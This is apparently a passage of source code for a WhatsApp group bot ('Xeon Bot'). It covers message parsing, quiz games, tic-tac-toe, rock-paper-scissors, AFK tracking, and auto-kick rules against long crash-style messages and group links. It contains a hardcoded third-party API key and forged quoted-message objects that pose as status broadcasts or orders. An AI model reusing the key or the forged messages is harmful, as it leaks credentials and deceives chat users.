//[© 2022 Xeon Bot Inc.]\\

//~you can re-upload but tag my channel
//or put my channel link in the description.
//~you can recode or copy the codes but give
//credit.
//~Thank you to LORD BUDDHA, ME AND MY 
//FAMILY.

//[modules]\\
require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
let { addLevelingId, addLevelingLevel, addLevelingXp, getLevelingId, getLevelingLevel, getLevelingXp } = require("./lib/lvlfunction")
const speedofbot = require("performance-now")
//var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
//var xhr = new XMLHttpRequest();

//[thumb]\\
let logonya = fs.readFileSync('./BotMedia/logo.jpg')

//[database]\\
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
const antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
const automsg = JSON.parse(fs.readFileSync('./database/automsg.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))

//[database reader]\\
global.db = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db) global.db = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    chats: {},
    ...(global.db || {})
}
let tebaklagu = db.game.tebaklagu = []
let _family100 = db.game.family100 = []
let kuismath = db.game.math = []
let tebakgambar = db.game.tebakgambar = []
let tebakkata = db.game.tebakkata = []
let caklontong = db.game.lontong = []
let caklontong_desk = db.game.lontong_desk = []
let tebakkalimat = db.game.kalimat = []
let tebaklirik = db.game.lirik = []
let tebaktebakan = db.game.tebakan = []
let vote = db.others.vote = []
	
module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const type = Object.keys(mek.message)[0]        
        const args = body.trim().split(/ +/).slice(1)
        const arg = body.substring(body.indexOf(' ') + 1)
        const pushname = m.pushName || "No Name"
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
	    const isMedia = /image|video|sticker|audio/.test(mime)  
		let imagedevil =  fs.readFileSync("./BotMedia/logo.jpg")
//[gc]\\
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const isAntiLink = m.isGroup ? antilink.includes(m.chat) : false
        const isAntiVirtex = m.isGroup ? antivirtex.includes(m.chat) : false
        const isAntiWame = m.isGroup ? antiwame.includes(m.chat) : false
        const isAutoMsg = m.message ? automsg.includes(m.chat) : false
        const isWelkom = m.message ? welkom.includes(m.chat) : false
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
//════════[runtime]═════════//
const runtime = function (seconds) {
seconds = Number(seconds);
var d = Math.floor(seconds / (3600 * 24));
var h = Math.floor((seconds % (3600 * 24)) / 3600);
var m = Math.floor((seconds % 3600) / 60);
var s = Math.floor(seconds % 60);
var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " Day, ") : "";
var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " Hour, ") : "";
var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " Minute, ") : "";
var sDisplay = s > 0 ? s + (s == 1 ? " second" : " Second") : "";
return dDisplay + hDisplay + mDisplay + sDisplay;
}
	
//[target]\\
      const sendWebp = async(to, url) => {
           var names = Date.now() / 10000;
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, './sticker' + names + '.png', async function () {
           console.log('selesai');
           let filess = './sticker' + names + '.png'
           let asw = './sticker' + names + '.webp'
           exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {
           fs.unlinkSync(filess)
           if (err) return reply(`${err}`)
           exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
           if (error) return reply(`${error}`)
           XeonBotInc.sendMessage(m.chat, fs.readFileSync(asw), sticker, {sendEphemeral:true, quoted:mek})
           fs.unlinkSync(asw)
});
});
});
}

const cel =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imagedevil, surface: 200, message: fake, orderTitle: '𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩', sellerJid: '0@s.whatsapp.net'} } }       
const ftroli =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imagedevil, surface: 200, message: fake, orderTitle: '𝑰𝒕𝒔 𝑴𝒆 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : ko', sellerJid: '0@s.whatsapp.net'} } }       
const fkon =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imagedevil, surface: 200, message: fake, orderTitle: '𝑰𝒕𝒔 𝑴𝒆 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : ko', sellerJid: '0@s.whatsapp.net'} } }       
     

const katalog = (teks) => {
            res = XeonBotInc.prepareMessageFromContent(m.chat,{ "orderMessage": { "itemCount": -73926483, "message": teks, "footerText": "𝑰𝒕𝒔 𝑴𝒆 𝐑𝐚𝐟𝐚𝐭𝐚 𝐛𝐨𝐭𝐳 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : 𝐑𝐚𝐟𝐥𝐢 𝐆𝐚𝐧𝐳", "thumbnail": imagedevil, "surface": 'CATALOG' }}, {quoted:ftroli})
            XeonBotInc.relayWAMessage(res)
        }
           
	const reply = (teks) => {
            XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botnma}`,"body": ` Join Bot's Official GC`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": global.groupwa }}}, { quoted: m})
        }
        
        const virtek = (teks) => {
            XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `${global.virtex}`}}})
        }
        
        const replay = (teks) => {
            XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.fake}`,"body": ` © 2022 ${global.botnma} by ${global.ownernma}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": global.medsos1url }}}, { quoted: m})
        }
try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.users[m.sender]
            if (typeof user !== 'object') global.db.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
            let chats = global.db.chats[m.chat]
                if (typeof chats !== 'object') global.db.chats[m.chat] = {}
                if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('wame' in chats)) chats.wame = false
             } else global.db.chats[m.chat] = {
                mute: false,
                wame: false,
        }
        } catch (err) {
            console.error(err)
        }
	    

//[public/self]\\
        if (!XeonBotInc.public) {
            if (!m.key.fromMe) return
        }

//[push msg to console \\
        if (m.message) {
        //  XeonBotInc.sendReadReceipt(m.chat, m.sender, [m.key.id])
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))

   }
//[autoread] ON/OF setting in config.js\\
       if (global.autoread === 'on') {
       if (m.message) {
	XeonBotInc.sendReadReceipt(m.chat, m.sender, [m.key.id])
	}
	}
	//const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		//const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		//const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		//const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

//[level(incomplete, still in devment)]\\
const levelRole = getLevelingLevel(m.sender)
	  var role = 'bronz'
	  if (levelRole <= 3) {
	role = 'Copper'
	  } else if (levelRole <= 5) {
	role = 'Iron'
	  } else if (levelRole <= 7) {
	role = 'Silver'
	  } else if (levelRole <= 10) {
	role = 'Gold'
	  } else if (levelRole <= 12) {
	role = 'Platinum'
	  } else if (levelRole <= 15) {
	role = 'Mithril'
	  } else if (levelRole <= 18) {
	role = 'Orichalcum'
	  } else if (levelRole <= 25) {
	role = 'Adamantite'
	  } else if (levelRole <= 45) {
	role = 'Good In Game'
	  }
	
//[Antilink]\\

	if (!m.isGroup) 
	if (body.startsWith('L')) {               
               	let anu = await fetchJson(`https://xteam.xyz/simsimi?kata=${text}&APIKEY=93e274b718d606e9`)
m.reply(`${budy}`)
} else if (body.startsWith('jo')) {              
               	let anu = await fetchJson(`https://xteam.xyz/simsimi?kata=${text}&APIKEY=93e274b718d606e9`)
m.reply(`${budy}`)
}

if (m.isGroup) 
if (budy.includes('izin')) {
if (m.isBaileys) {               

	tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
	
	XeonBotInc.sendMessage(m.chat, { text : `hj`, mentions: participants.map(a => a.id)})
	}
	}
	
	
	
//ANTI VIRTEX === AUTO BLOCK 
if (!m.isGroup) 
if (body.length > 50000)  {
               if (!m.key.fromMe) {
               	     if (isCreator) return m.reply(`Owner bot mah bebas kirim virtek :v`)            
        let users = m.sender 
let users2 = m.sender.replace(/[^0-9]/g, '')
        let buttons = [
                     {buttonId: `#unblockuser ${users}`, buttonText: {displayText: `⭕BUKA BLOCKIR ${users2}⭕`}, type: 1}
                ]
                let buttonMessage = {
                    text: `https://wa.me/${users2} terdeteksi mengirim pesan ke BOT dengan lebih dari 50k karakter,itu memiliki potensi VIRTEX\n\n BOT telah memblokir nomor tersebut,Jika ini merupakan kesalahan ,Anda sebagai owner BOT bisa membuka blokir dengan cara menekan tombol di bawah`,
                    footer: `Unblock pengguna`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(`${global.pemilik}@s.whatsapp.net`, buttonMessage)
        m.reply(`*VIRTEX DETECTED* \n\nAnda terdeteksi mengirimkan virtex\nBot akan memblokir nomor kamu!`)
        await sleep(5000)          
        await XeonBotInc.updateBlockStatus(users, 'block') 
        }
        }
        
//ANTI VIRTEX IN GROUP === AUTO KICK 
if (!isAntiVirtex) 
if (m.isGroup) 
if (body.length > 50000)  {
               if (!m.key.fromMe) {
               	if (isAdmins) return m.reply(`Admin group mah bebas kirim virtek :v`)             
        if (isCreator) return m.reply(`Owner bot mah bebas kirim virtek :v`)             
               	   let sianj = m.sender  
             let buttons = [
                     {buttonId: `#antivirtex off`, buttonText: {displayText: 'MATIKAN Anti virtex 📴'}, type: 1},
{buttonId: `#adduser ${sianj}`, buttonText: {displayText: 'Add kembali user yang terkick 🔙'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: ' *VIRTEX DETECTED* \n\nAnda terdeteksi mengirimkan virtex' ,
                    footer: `Good Bye To You..👋🏻`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             await sleep(3000)            
               await XeonBotInc.groupParticipantsUpdate(m.chat, [sianj], 'remove')
               }
	  }  
	
	  //ANTI LINK GC IN GROUP === AUTO KICK 
	if (!isAntiLink) 
	if (m.isGroup) 
if (budy.includes('chat.whatsapp.com')) {
               if (!m.key.fromMe) {
               	if (isAdmins) return m.reply(`Admin group mah bebas kirim link gc :v`)
        if (isCreator) return m.reply(`Owner bot mah bebas kirim link gc :v`)
            let sianj = m.sender   
    let buttons = [
                     {buttonId: `#antilink off`, buttonText: {displayText: 'MATIKAN Anti Link GC📴'}, type: 1},
{buttonId: `#adduser ${sianj}`, buttonText: {displayText: 'Add kembali user yang terkick 🔙'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: '*LINK DETECTED*\n\nAnda terdeteksi menyebarkan Link Group WhatsApp di area dilarang share link group' ,
                    footer: `Good Bye To You..👋🏻`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             await sleep(3000)            
               await XeonBotInc.groupParticipantsUpdate(m.chat, [sianj], 'remove')
               }
	  }
	
	//ANTI wa.me IN GROUP === AUTO KICK 
	if (isAntiWame) 
	if (m.isGroup) 
if (budy.includes('wa.me/')) {
               if (!m.key.fromMe) {
               	if (isAdmins) return m.reply(`Admin group mah bebas kirim link wa.me :v`)
        if (isCreator) return m.reply(`Owner bot mah bebas kirim link wa.me :v`)
               let sianj = m.sender   
                   let buttons = [
                     {buttonId: `#antiwame off`, buttonText: {displayText: 'MATIKAN Anti wa.me 📴'}, type: 1},
{buttonId: `#adduser ${sianj}`, buttonText: {displayText: 'Add kembali user yang terkick 🔙'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: '*LINK DETECTED*\n\nAnda terdeteksi menyebarkan Link wa.me di area dilarang share link wa.me' ,
                    footer: `Good Bye To You..👋🏻`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             await sleep(3000)            
               await XeonBotInc.groupParticipantsUpdate(m.chat, [sianj], 'remove')
               }
	  }
	
//[mute chat]\\
      if (db.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }
//[write database every 1min]\\
	setInterval(() => {
            fs.writeFileSync('./src/database.json', JSON.stringify(global.db, null, 2))
        }, 60 * 1000)

//[reset limit every 12hrs]\\
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
	    
//[respond cmd with media]\\
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
        let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: XeonBotInc.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        XeonBotInc.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?give up|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Answer the following questions :\n${room.soal}\n\n\nThere is ${room.jawaban.length} Answer ${room.jawaban.find(v => v.includes(' ')) ? `(some answers have spaces)` : ''}
${isWin ? `All Answers Answered` : isSurender ? 'Give up!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            XeonBotInc.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak lagu', buttonText: { displayText: 'Guess The Music' }, type: 1 }], `🎮 Guess The Song 🎮\n\nCorrect Answer 🎉\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else reply('*Wrong answer!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await reply(`🎮 Math Quiz  🎮\n\nCorrect answer 🎉\n\nWant to play again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak gambar', buttonText: { displayText: 'Guess The Picture' }, type: 1 }], `🎮 Guess The Picture 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak kata', buttonText: { displayText: 'Guess The Word' }, type: 1 }], `🎮 Guess The Word 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak lontong', buttonText: { displayText: 'Guess Lontong' }, type: 1 }], `🎮 Guess Lontong 🎮\n\nCorrect answer 🎉\n*${deskripsi}*\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak kalimat', buttonText: { displayText: 'Guess The Sentence' }, type: 1 }], `🎮 Guess The Sentence 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak lirik', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `🎮 Guess The Lyrics 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak tebakan', buttonText: { displayText: 'Riddles' }, type: 1 }], `🎮 Riddles 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }
        
//[tictactoe]\\
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Game has ended',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *give up* to surrender and admit defeat`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await XeonBotInc.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await XeonBotInc.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

//[suit]\\
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|sure|oke?|reject|dont|later|yes|can|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|dont|later|n|no|can)/i.test(m.text)) {
	    XeonBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} reject the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    XeonBotInc.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) XeonBotInc.sendText(roof.p, `Please select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, `Please select \n\nRock🗿\nPaper📄\nScissor✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) XeonBotInc.sendText(m.chat, `Both players don't want to play,\nSuit canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    XeonBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} didn't choose suit, game over`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) XeonBotInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    XeonBotInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            reply(`
Don't tag him!
He's in Offline/AFK, ${reason ? 'with reason ' + reason : 'no reason'}
Its been ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.users[m.sender].afkTime > -1) {
            let user = global.db.users[m.sender]
            reply(`
You came back online from AFK${user.afkReason ? ' after ' + user.afkReason : ''}
In ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
	    
        switch(command) {
	    case '7afk': {
                let user = global.db.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} Already Afk${text ? ': ' + text : ''}`)
